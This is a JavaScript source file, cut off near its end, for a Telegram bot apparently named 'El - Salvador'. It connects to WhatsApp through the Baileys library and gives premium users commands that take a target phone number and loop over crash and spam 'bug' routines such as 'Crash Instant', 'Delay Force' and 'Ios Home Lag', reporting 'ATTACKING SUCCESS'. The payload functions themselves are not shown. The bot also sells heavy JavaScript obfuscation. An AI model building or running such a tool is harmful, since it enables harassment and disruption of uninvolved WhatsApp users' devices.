/*
 ~ https://t.me/+5k-HpfOp-Aw1YzA8
*/
const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const FormData = require("form-data");
const axios = require("axios");
const JsConfuser = require('js-confuser')
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const cheerio = require("cheerio");

//gtw sih wir pas di dec ada require ini jadi gw tambahin dah tuh file
const obfuscateCode = require('./toolsobf');

const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/5oxcqy.jpg",
    "https://files.catbox.moe/spcrnj.jpg",
    "https://files.catbox.moe/8lw4hz.jpg",
    "https://files.catbox.moe/qq571d.jpg",
    "https://files.catbox.moe/189vt5.jpg",
    "https://files.catbox.moe/xg9l9p.jpg",
    "https://files.catbox.moe/ewqt47.jpg",
    "https://files.catbox.moe/sjii8y.jpg",
    "https://files.catbox.moe/6ykzx8.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);
    store.bind(Aii.ev);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ WhatsApp belum terhubung!
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `
\`\`\`
╭━━━⊱  𝐄𝐥 - 𝐒𝐚𝐥𝐯𝐚𝐝𝐨𝐫   ━━━━━❍
┃▢ Developer : Chinedu 
┃▢ Version : 1.0 GlX
┃▢ Runtime : ${waktuRunPanel}
┃▢ Language : JavaScript
╰━━━━━━━━━━━━━━━━━❍\`\`\`
`,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐒͢𝐇͡𝐎͜ᬁ𝐖 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 🦠', 'crash'),
             Markup.button.callback('𝐀͢𝐊͡𝐒𝐄͜⍣𝐒 🎭', 'akses'),
         ],
         [
             Markup.button.callback('𝐂𝐄𝐊 𝐈𝐃🤍', 'cekid'),
         ],
         [
             Markup.button.callback('𝐓͢𝐐⍣𝐓𝐎͓͡𝐎 🕊️', 'tqto'),
         ],
         [
             Markup.button.url('⌜ 𝗗𝗲𝘃 ⌟', 'https://https://t.me/+5k-HpfOp-Aw1YzA8'),
         ]
       ])
    });
});

// Perintah untuk mengecek status ID
bot.action('cekid', async (ctx) => {
    const userId = ctx.from.id.toString();
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
  ]);

  const caption = `\`\`\`
𝗜𝗗 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗔𝗡𝗗𝗔

𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${ctx.from.first_name}
𝗜𝗗 : ${senderId}\`\`\``
    await editMenu(ctx, caption, buttons);
});

bot.action('crash', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
  ]);

  const caption = `
┏━━━━ 𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑 ━━━❍
┃⊱ 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 : 𝐏𝐢𝐚𝐧𝐳 𝐌𝐚𝐧𝐭𝐚𝐩
┃⊱ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 𝐈.0
┃⊱ 𝙐𝙨𝙚𝙧𝙉𝙖𝙢𝙚 : ${ctx.from.first_name}
┗━━━━━━━━━━━━━━━━━❍
┏━━[ 𐂡 ] ⌠ 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ⌡
┃
┃✧ /exavator 628xxx
┃     ├╼⟡ Delay Force 
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 90 Message
┃
┃✧ /dexminor 628xxx
┃     ├╼⟡ Crash Instant
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 100 Message
┃
┃✧ /axvorex 628xxx
┃     ├╼⟡ Bussines X Crash UI
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 80 Message
┃
┃✧ /thunder 628xxx
┃     ├╼⟡ Bussines X Original
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 200
┃
┃✧ /superior 628xxx
┃     ├╼⟡ Ios Home Lag
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 100
┃
┃✧ /forever 628xxx
┃     ├╼⟡ Invisible Home
┃     ├╼⟡ Total Spam Bug
┃     └╼⟡ 96 Message
┗━━━━━━━━━━━━━━━━━━━━❍
 © El - Salvador
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('akses', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
  ]);

  const caption = `
┏━━[ 𐂡 ] ⌠ 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ⌡
┃
┃⌬ /addadmin ￫ ID
┃⌬ /deladmin ￫ ID
┃⌬ /addprem ￫ ID
┃⌬ /delprem ￫ ID
┃⌬ /cekprem
┃⌬ /connect ⚘ Support all Number
┃ 
┗━━━━━━━━━━━━━━━━━━━━❍
ᨑ © El - Salvador`;

  await editMenu(ctx, caption, buttons);
});

bot.action('tqto', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
  ]);

  const caption = `
╔─═「 𝐓͢𝐇͠𝐀͜𝐍𝐊⍣𝛞𝐓͢𝐎͓͡𝐎 」
║┏─⊱
│▢ 𝐀𝐥𝐥𝐚𝐡 𝐒𝐖𝐓 (𝐌𝐲 𝐆𝐨𝐝)
│┗─⊱
╚─═─═─═─═─═─═─═⪩
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐒͢𝐇͡𝐎͜ᬁ𝐖 𝐂͢𝐑͠𝐀᷼𝐒͠⍣𝐇 🦠', 'crash'),
             Markup.button.callback('𝐀͢𝐊͡𝐒𝐄͜⍣𝐒 🎭', 'akses'),
         ],
         [
             Markup.button.callback('𝐂𝐄𝐊 𝐈𝐃🤍', 'cekid'),
         ],
         [
             Markup.button.callback('𝐓͢𝐐⍣𝐓𝐎͓͡𝐎 🕊️', 'tqto'),
         ],
         [
             Markup.button.url('⌜ 𝗗𝗲𝘃 ⌟', 'https://https://t.me/+5k-HpfOp-Aw1YzA8'),
         ]
]);

  const caption = `
\`\`\`
╭━━━⊱  𝐄𝐥 - 𝐒𝐚𝐥𝐯𝐚𝐝𝐨𝐫   ━━━━━❍
┃▢ Developer : https://t.me/+5k-HpfOp-Aw1YzA8
┃▢ Version : 1.0 GlX
┃▢ Runtime : ${waktuRunPanel}
┃▢ Language : JavaScript
╰━━━━━━━━━━━━━━━━━❍\`\`\`
`;

  await editMenu(ctx, caption, buttons);
});

bot.command('obfmenu', (ctx) => {
console.log(`Perintah diterima: /obfmenu dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const menuText = `
\`\`\`Obfuscation Menu
1. /obf1 - Var [HardObf!]
2. /obf2 - Var [ExtremeObf!]
3. /obf3 - DeadCode [ExtremeObf!]
4. /obf4 - EncCode [ExtremeObf!!]
5. /obf5 - ABCD [HardObf!]
6. /obf6 - Name [ExtremeObf!!]
7. /obf7 - Name [ExtremeObf!!]
8. /obf8 - Name [ExtremeObf!]
9. /obf9 - Crass [HardObf!]
10. /encrypthard - China [Extrime]
👽AMANKAN SCRIPT MU SEGARA‼️

Dev : @x_rehmann

📄 Kirim file .js Anda setelah memilih jenis Obfuscation.\`\`\`
    `;

    ctx.reply(menuText, { parse_mode: 'Markdown' });
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
bot.command('obf1', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf1' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Rename All Variable Var).');
});

// Command for obfuscation type obf2 (Hexadecimal Anti Dec)
bot.command('obf2', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf2' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Hexadecimal Anti Dec).');
});

// Command for obfuscation type obf3 (Random Deadcode)
bot.command('obf3', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf3' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Random Deadcode).');
});

// Command for obfuscation type obf4 (Return Obfuscation)
bot.command('obf4', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf4' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation.');
});

//mangled
bot.command('obf5', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf5' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Type 5).');
});

bot.command('obf6', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf6' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Type 6).');
});

bot.command('obf7', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf7' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Type 7).');
});

bot.command('obf8', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf8' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Type 8).');
});

bot.command('obf9', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Anda tidak memiliki akses premium.');
    }

    userSessions[userId] = { obfuscationType: 'obf9' };
    ctx.reply('📄 Silakan kirim file .js Anda untuk Obfuscation (Type 9).');
});


bot.command("encrypthard", async (ctx) => {
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('❌ Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Memproses file untuk enkripsi
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    ctx.reply("⏳ Memproses encrypt hard code . . .");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
           const originalString = 
            "素素Pianzz素素" + 
            "素素Pianzz素素";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z座king素Rehman素晴]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const charactersLength = characters.length;
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    await ctx.replyWithDocument(
        { source: encryptedFilePath, filename: `encrypted_${fileName}` },
        { caption: "✅ File berhasil terenkripsi!" }
    );
});

bot.on('document', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (!premiumUsers.includes(userId)) {
        return ctx.reply('❌ Fitur ini hanya tersedia untuk pengguna premium.');
    }

    const fileName = ctx.message.document.file_name;

    if (!fileName.endsWith('.js')) {
        return ctx.reply('❌ Silakan kirim file dengan ekstensi .js.');
    }

    if (!userSessions[userId] || !userSessions[userId].obfuscationType) {
        return ctx.reply('❌ Silakan pilih jenis obfuscation terlebih dahulu menggunakan salah satu perintah.');
    }

    const obfuscationType = userSessions[userId].obfuscationType;

    // Reduce premium days
    reducePremiumDays(userId);

    await handleDocumentObfuscation(ctx, obfuscationType);
});

async function handleDocumentObfuscation(ctx, option) {
    const fileId = ctx.message.document.file_id;
    const loadingMessage = await ctx.reply('🚧 Preparing obfuscation...');

    try {
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const code = await downloadFile(fileLink);

        await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, undefined, '🔄 Encrypting...');
        const obfuscatedCode = await obfuscateCode(code, option);

        await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, undefined, '🎉 Obfuscation complete! Sending file...');
        await ctx.replyWithDocument({ source: Buffer.from(obfuscatedCode), filename: 'obfuscated.js' }, {
            caption: `Tools Obf: ${option}\n@x_rehmann`,
            parse_mode: 'Markdown'
        });

    } catch (error) {
        console.error('Kesalahan selama proses obfuscation', error);
        await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, undefined, '❌ Terjadi kesalahan saat kebingungan obfuscation.');
    }
}

const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍\`\`\`
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('⌫ Back to Menu', 'El - Salvador1'),
                       Markup.button.url('⌜ ⟐ ⌟', 'https://t.me/AiiSigma'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By El - Salvador')));
    })();
}

bot.command("exavator", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/exavator 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 50; i++) {
    await NVIP1(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});


bot.command("dexminor", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/dexminor 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 2; i++) {
      await DorVip3(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("axvorex", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/axvorex 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 3; i++) {
       await DorVip2(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});



bot.command("forever", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/forever 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 8; i++) {
        await NVIP5(target);
        await NVIP5(target);
        await N1(target);
        await N1(target);
        await NVIP4(target);
        await NVIP4(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("thunder", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/thunder 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 1; i++) {
      await DorVip1(target);
      await DorVip2(target);
      await DorVip3(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("superior", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/superior 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🎯 Mencari Target. .`);

    for (let i = 0; i < 5; i++) {
      await DorVipIP1(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 Pengguna ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
